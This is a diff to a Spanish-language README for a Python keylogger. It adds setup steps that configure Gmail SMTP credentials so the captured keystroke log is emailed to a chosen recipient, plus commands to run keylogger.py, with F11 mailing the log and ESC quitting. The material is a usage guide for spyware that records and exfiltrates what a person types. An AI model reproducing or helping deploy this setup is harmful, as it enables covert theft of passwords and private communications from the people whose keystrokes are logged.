@@ -29,6 +29,30 @@ pip install secure-smtplib
 
 Después de instalar las dependencias, verifica que se hayan instalado correctamente ejecutando:
 
+## ✉️ Configuración del Correo
+
+Abre el archivo y reemplaza los siguientes valores con tu información:
+
+```python
+mensaje["From"] = "tucorreo@gmail.com"
+mensaje["To"] = "destinatario@gmail.com"
+server.login("tucorreo@gmail.com", "tu_contraseña")
+server.sendmail("tucorreo@gmail.com", "destinatario@gmail.com", mensaje.as_string().encode('utf-8'))
+```
+
+🔹 **Usa una contraseña de aplicación en lugar de tu contraseña real para mayor seguridad.**
+
+## ▶️ Ejecutar el Keylogger
+
+Para iniciar el keylogger, ejecuta:
+
+```bash
+python keylogger.py
+```
+
+📌 **Presiona `F11` para enviar el registro por correo o `ESC` para salir.**
+
+
 ```bash
 pip list | grep -E "pynput|smtplib|email"
 ```
